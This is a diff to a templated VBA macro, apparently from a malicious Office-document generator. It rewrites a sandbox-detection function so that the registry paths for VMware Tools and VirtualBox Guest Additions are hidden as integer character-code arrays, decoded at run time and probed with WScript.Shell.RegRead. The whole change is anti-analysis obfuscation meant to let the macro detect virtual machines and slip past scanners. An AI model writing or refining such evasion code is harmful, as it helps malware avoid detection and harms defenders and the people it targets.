@@ -111,18 +111,38 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     For i = 0 To UBound(badC)
         If InStr(cname, CStr(badC(i))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Next
-    ' VM/hypervisor registry key checks
-    Dim vmKeyPath As String
-    vmKeyPath = "HKLM\SOFTWARE\VMware, Inc.\VMware Tools\InstallPath"
+    ' VM/hypervisor registry key checks (paths obfuscated as integer arrays)
     On Error Resume Next
-    Dim regVal As String
-    regVal = Environ("PROCESSOR_IDENTIFIER")  ' will be replaced by Shell.RegRead pattern
+    Dim vmCodes(50) As Integer
+    vmCodes(0)=72:vmCodes(1)=75:vmCodes(2)=76:vmCodes(3)=77:vmCodes(4)=92
+    vmCodes(5)=83:vmCodes(6)=79:vmCodes(7)=70:vmCodes(8)=84:vmCodes(9)=87
+    vmCodes(10)=65:vmCodes(11)=82:vmCodes(12)=69:vmCodes(13)=92:vmCodes(14)=86
+    vmCodes(15)=77:vmCodes(16)=119:vmCodes(17)=97:vmCodes(18)=114:vmCodes(19)=101
+    vmCodes(20)=44:vmCodes(21)=32:vmCodes(22)=73:vmCodes(23)=110:vmCodes(24)=99
+    vmCodes(25)=46:vmCodes(26)=92:vmCodes(27)=86:vmCodes(28)=77:vmCodes(29)=119
+    vmCodes(30)=97:vmCodes(31)=114:vmCodes(32)=101:vmCodes(33)=32:vmCodes(34)=84
+    vmCodes(35)=111:vmCodes(36)=111:vmCodes(37)=108:vmCodes(38)=115:vmCodes(39)=92
+    vmCodes(40)=73:vmCodes(41)=110:vmCodes(42)=115:vmCodes(43)=116:vmCodes(44)=97
+    vmCodes(45)=108:vmCodes(46)=108:vmCodes(47)=80:vmCodes(48)=97:vmCodes(49)=116
+    vmCodes(50)=104
     Dim wshShell As Object
     Set wshShell = CreateObject("WScript.Shell")
-    wshShell.RegRead vmKeyPath
+    wshShell.RegRead {{ v.fn_build_str }}(vmCodes)
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
     Err.Clear
-    wshShell.RegRead "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions\Version"
+    Dim vbCodes(54) As Integer
+    vbCodes(0)=72:vbCodes(1)=75:vbCodes(2)=76:vbCodes(3)=77:vbCodes(4)=92
+    vbCodes(5)=83:vbCodes(6)=79:vbCodes(7)=70:vbCodes(8)=84:vbCodes(9)=87
+    vbCodes(10)=65:vbCodes(11)=82:vbCodes(12)=69:vbCodes(13)=92:vbCodes(14)=79
+    vbCodes(15)=114:vbCodes(16)=97:vbCodes(17)=99:vbCodes(18)=108:vbCodes(19)=101
+    vbCodes(20)=92:vbCodes(21)=86:vbCodes(22)=105:vbCodes(23)=114:vbCodes(24)=116
+    vbCodes(25)=117:vbCodes(26)=97:vbCodes(27)=108:vbCodes(28)=66:vbCodes(29)=111
+    vbCodes(30)=120:vbCodes(31)=32:vbCodes(32)=71:vbCodes(33)=117:vbCodes(34)=101
+    vbCodes(35)=115:vbCodes(36)=116:vbCodes(37)=32:vbCodes(38)=65:vbCodes(39)=100
+    vbCodes(40)=100:vbCodes(41)=105:vbCodes(42)=116:vbCodes(43)=105:vbCodes(44)=111
+    vbCodes(45)=110:vbCodes(46)=115:vbCodes(47)=92:vbCodes(48)=86:vbCodes(49)=101
+    vbCodes(50)=114:vbCodes(51)=115:vbCodes(52)=105:vbCodes(53)=111:vbCodes(54)=110
+    wshShell.RegRead {{ v.fn_build_str }}(vbCodes)
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
     Err.Clear
     Set wshShell = Nothing
